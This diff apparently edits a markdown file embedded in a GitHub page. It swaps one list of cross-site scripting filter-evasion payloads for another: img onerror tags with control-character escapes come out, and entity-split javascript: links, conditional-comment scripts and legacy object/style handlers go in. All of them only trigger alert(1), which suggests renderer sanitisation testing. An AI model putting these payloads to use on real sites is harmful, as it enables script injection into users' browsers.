@@ -8,40 +8,16 @@
 ![
 <img src="https://avatars.githubusercontent.com/u/92805783?&s=40&v="/>
 
-<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
-<img \x00src=x onerror="alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x11src=x onerror="javascript:alert(1)">
-<img \x12src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x10src=x onerror="javascript:alert(1)">
-<img\x13src=x onerror="javascript:alert(1)">
-<img\x32src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x11src=x onerror="javascript:alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x34src=x onerror="javascript:alert(1)">
-<img \x39src=x onerror="javascript:alert(1)">
-<img \x00src=x onerror="javascript:alert(1)">
-<img src\x09=x onerror="javascript:alert(1)">
-<img src\x10=x onerror="javascript:alert(1)">
-<img src\x13=x onerror="javascript:alert(1)">
-<img src\x32=x onerror="javascript:alert(1)">
-<img src\x12=x onerror="javascript:alert(1)">
-<img src\x11=x onerror="javascript:alert(1)">
-<img src\x00=x onerror="javascript:alert(1)">
-<img src\x47=x onerror="javascript:alert(1)">
-<img src=x\x09onerror="javascript:alert(1)">
-<img src=x\x10onerror="javascript:alert(1)">
-<img src=x\x11onerror="javascript:alert(1)">
-<img src=x\x12onerror="javascript:alert(1)">
-<img src=x\x13onerror="javascript:alert(1)">
-<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
-<img src=x onerror=\x09"javascript:alert(1)">
-<img src=x onerror=\x10"javascript:alert(1)">
-<img src=x onerror=\x11"javascript:alert(1)">
-<img src=x onerror=\x12"javascript:alert(1)">
-<img src=x onerror=\x32"javascript:alert(1)">
-<img src=x onerror=\x00"javascript:alert(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:alert(1)//">
+<title onpropertychange=javascript:alert(1)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<!--[if]><script>javascript:alert(1)</script -->
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+<script src="/\%(jscript)s"></script>
+<script src="\\%(jscript)s"></script>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
 
 ](()
